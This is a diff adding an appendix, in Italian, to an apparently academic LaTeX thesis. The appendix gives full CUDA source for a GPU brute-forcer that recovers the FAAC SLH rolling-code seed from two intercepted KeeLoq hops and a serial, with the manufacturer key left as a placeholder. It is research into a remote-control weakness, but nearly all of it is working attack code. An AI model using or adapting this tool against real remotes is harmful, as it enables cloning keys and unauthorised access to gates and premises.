@@ -95,3 +95,237 @@ for
   }
 instance->cnt = decrypt & 0xFFFFF;
 \end{lstlisting}
+
+\chapter{Brute-forcer del seed di FAAC SLH in CUDA}
+\label{appendix:cuda}
+
+Di seguito è riportato il codice in CUDA dell'algoritmo di brute forcing del seed di FAAC SLH. Tale algoritmo assume che due chiavi normali in sequnza siano state catturate e prende in input i due code hop e il serial intercettati.
+\begin{lstlisting}[language=C++,basicstyle=\small,showstringspaces=false]
+#include <cstdlib>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <cuda_runtime.h>
+
+#define MFKEY 0xFFFFFFFFFFFFFFFF
+#define KEELOQ_NLF 0x3A5C742E
+#define bit(x, n) (((x) >> (n)) & 1)
+#define g5(x, a, b, c, d, e) (bit(x, a) + bit(x, b) * 2 + \\
+          bit(x, c) * 4 + bit(x, d) * 8 + bit(x, e) * 16)
+
+__device__ uint32_t keeloq_encrypt_device(uint32_t data, uint64_t key) {
+    uint32_t x = data;
+    for (int r = 0; r < 528; r++) {
+        x = (x >> 1) ^ ((bit(x, 0) ^ bit(x, 16) ^ (uint32_t)bit(key, r & 63) ^
+                         bit(KEELOQ_NLF, g5(x, 1, 9, 20, 26, 31))) << 31);
+    }
+    return x;
+}
+
+__device__ uint64_t faac_learning_device(uint32_t seed, uint64_t key) {
+    uint16_t hs = seed >> 16;
+    const uint16_t ending = 0x544D;
+    uint32_t lsb = (uint32_t)hs << 16 | ending;
+    uint64_t man = (uint64_t)keeloq_encrypt_device(seed, key) << 32 |
+                             keeloq_encrypt_device(lsb, key);
+    return man;
+}
+
+struct Result {
+    bool found;
+    uint32_t seed;
+    uint32_t count;
+};
+
+__global__ void find_sequence_chunk_kernel(
+    uint32_t first_hop,
+    uint32_t second_hop,
+    uint64_t mfkey,
+    uint32_t fix,
+    uint32_t start_seed,
+    uint32_t end_seed,
+    Result *result) {
+    uint32_t seed = blockIdx.x * blockDim.x + threadIdx.x + start_seed;
+    if (seed > end_seed || result->found) return;
+
+    uint64_t man = faac_learning_device(seed, mfkey);
+    uint8_t fixx[8];
+    int shiftby = 32;
+    for (int i = 0; i < 8; i++) {
+        fixx[i] = (fix >> (shiftby -= 4)) & 0xF;
+    }
+
+    uint32_t prev_hop = keeloq_encrypt_device(fixx[6] << 28 |
+                        fixx[7] << 24 | fixx[5] << 20 | 0xFFFFF, mfkey);
+
+    for (uint32_t count = 0x1; count <= 0xFFFFF && !result->found; ++count) {
+        uint32_t decrypt;
+        if ((count % 2) == 0) {
+            decrypt = fixx[6] << 28 | fixx[7] << 24 |
+                      fixx[5] << 20 | (count & 0xFFFFF);
+        } else {
+            decrypt = fixx[2] << 28 | fixx[3] << 24 |
+                      fixx[4] << 20 | (count & 0xFFFFF);
+        }
+
+        uint32_t hop = keeloq_encrypt_device(decrypt, man);
+
+        if (prev_hop == first_hop && hop == second_hop) {
+            result->found = true;
+            result->seed = seed;
+            result->count = count;
+            break;
+        }
+        prev_hop = hop;
+
+        if (count == 0x1)
+            printf("Thread %d, Seed: %08X, Count: %05X, Decrypt: %08X,
+            Hop: %08X\n", threadIdx.x + blockIdx.x * blockDim.x,
+            seed, count, decrypt, hop);
+    }
+}
+
+int main(void) {
+    uint32_t first_hop, second_hop, fix;
+    char hex_input[10];
+    char *endptr1, *endptr2, *endptr3;
+
+    printf("Enter first hop (without 0x): ");
+    while (fgets(hex_input, sizeof(hex_input), stdin) == NULL) {
+        perror("Error reading input, try again");
+    }
+    size_t len = strlen(hex_input);
+    if (len > 0 && hex_input[len - 1] == '\n') {
+        hex_input[len - 1] = '\0';
+    }
+    first_hop = strtoul(hex_input, &endptr1, 16);
+
+    printf("Enter second hop (without 0x): ");
+    while (fgets(hex_input, sizeof(hex_input), stdin) == NULL) {
+        perror("Error reading input, retry");
+    }
+    len = strlen(hex_input);
+    if (len > 0 && hex_input[len - 1] == '\n') {
+        hex_input[len - 1] = '\0';
+    }
+    second_hop = strtoul(hex_input, &endptr2, 16);
+
+    printf("Enter fix (without 0x): ");
+    while(fgets(hex_input, sizeof(hex_input), stdin) == NULL) {
+        perror("Error reading input, retry");
+    }
+    len = strlen(hex_input);
+    if(len > 0 && hex_input[len - 1] == '\n') {
+        hex_input[len - 1] = '\0';
+    }
+    fix = strtoul(hex_input, &endptr3, 16);
+
+    if (*endptr1 != '\0' || *endptr2 != '\0' || *endptr3 != '\0') {
+        fprintf(stderr, "Error: invalid hexadecimal characters found\n");
+        return 1;
+    }
+
+    printf("\nFirst hop: %08X\nSecond hop: %08X\nFix: %08X\n\nContinue? (y/N) ",
+            first_hop, second_hop, fix);
+    char input[10];
+    while (fgets(input, sizeof(input), stdin) == NULL) {
+        perror("Bruh");
+    }
+    len = strlen(input);
+    if (len > 0 && input[len - 1] == '\n') {
+        input[len - 1] = '\0';
+    }
+    if (strcmp(input, "y") != 0) {
+        printf("Aborting.\n");
+        return 1;
+    }
+    printf("Continuing execution on GPU with chunked seed processing...\n");
+
+    Result host_result;
+    host_result.found = false;
+    host_result.seed = 0;
+    host_result.count = 0;
+
+    Result *device_result;
+    cudaError_t cuda_err;
+    cuda_err = cudaMalloc((void **)&device_result, sizeof(Result));
+    if (cuda_err != cudaSuccess) {
+        fprintf(stderr, "CUDA malloc failed: %s\n",
+                cudaGetErrorString(cuda_err));
+        return 1;
+    }
+    cuda_err = cudaMemcpy(device_result, &host_result,
+                          sizeof(Result), cudaMemcpyHostToDevice);
+    if (cuda_err != cudaSuccess) {
+        fprintf(stderr, "CUDA memcpy HtoD (initial result) failed: %s\n",
+                cudaGetErrorString(cuda_err));
+        cudaFree(device_result);
+        return 1;
+    }
+
+    uint32_t start_seed = 0x0;
+    uint32_t chunk_size = 0x100000;
+    int threadsPerBlock = 1024;
+
+    while (start_seed <= 0xFFFFFFFF && !host_result.found) {
+        uint32_t end_seed = start_seed + chunk_size - 1;
+        if (end_seed > 0xFFFFFFFF) {
+            end_seed = 0xFFFFFFFF;
+        }
+
+        int numBlocks = (chunk_size + threadsPerBlock - 1) / threadsPerBlock;
+
+        find_sequence_chunk_kernel<<<numBlocks, threadsPerBlock>>>(
+          first_hop,
+          second_hop,
+          MFKEY,
+          fix,
+          start_seed,
+          end_seed,
+          device_result);
+
+        cudaDeviceSynchronize();
+        cuda_err = cudaGetLastError();
+        if (cuda_err != cudaSuccess) {
+            fprintf(stderr, "CUDA kernel launch failed for seed range \\
+            [%08X - %08X]: %s\n",
+            start_seed, end_seed,
+            cudaGetErrorString(cuda_err));
+            cudaFree(device_result);
+            return 1;
+        }
+
+        cuda_err = cudaMemcpy(
+          &host_result,
+          device_result,
+          sizeof(Result),
+          cudaMemcpyDeviceToHost);
+        if (cuda_err != cudaSuccess) {
+            fprintf(stderr, "CUDA memcpy DtoH (result update) \\
+            failed: %s\n", cudaGetErrorString(cuda_err));
+            cudaFree(device_result);
+            return 1;
+        }
+
+        if (host_result.found) {
+            break;
+        }
+
+        start_seed += chunk_size;
+    }
+
+    cudaFree(device_result);
+
+    if (host_result.found) {
+        printf("FOUND:\nSeed: %08X\tCount: %05X\n",
+        host_result.seed,
+        host_result.count);
+    } else {
+        printf("Sequence not found after checking all seed ranges.\n");
+    }
+
+    return 0;
+}
+\end{lstlisting}
